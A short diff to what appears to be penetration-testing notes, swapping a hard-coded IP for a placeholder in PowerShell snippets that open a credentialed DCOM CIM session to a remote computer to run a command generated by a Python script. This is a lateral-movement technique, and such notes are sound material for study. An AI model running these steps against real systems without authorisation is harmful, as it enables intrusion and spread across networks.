@@ -34,7 +34,7 @@ $credential = New-Object System.Management.Automation.PSCredential $username, $s
 $Options = New-CimSessionOption -Protocol DCOM
 ```
 ```powershell
-$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
+$Session = New-Cimsession -ComputerName $(TARGET_COMPUTER_IP) -Credential $credential -SessionOption $Options
 ```
 ```powershell
 $Command = '$(OUTPUT_OF_PYTHON_SCRIPT)';
